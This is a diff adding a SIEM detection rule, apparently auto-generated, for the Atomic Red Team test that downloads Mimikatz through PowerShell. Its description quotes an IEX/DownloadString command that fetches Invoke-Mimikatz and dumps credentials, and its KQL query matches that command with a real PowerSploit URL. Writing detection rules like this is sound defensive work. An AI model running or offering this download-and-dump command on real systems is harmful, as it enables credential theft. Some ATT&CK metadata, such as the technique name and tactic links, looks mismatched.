@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Mimikatz' (GUID: f3132740-55bc-48c4-bcc0-758a459cd027) of technique T1059.001 (Command and Scripting Interpreter: PowerShell). Test Description: Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.. Command/Steps: powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\\\"\n"
+from = "now-9m"
+rule_id = "bafa111b-9923-4567-a92a-d60865d6d3d9"
+language = "kql"
+name = "Atomic Test: T1059.001 - Mimikatz"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1059.001/T1059.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1059.001", "f3132740-55bc-48c4-bcc0-758a459cd027", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*powershell.exe*\\\" AND process.command_line : \\\"*(New-Object*\\\" AND process.command_line : \\\"*Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1')*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1059.001"
+name = "Mimikatz"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1059/001"
+
+
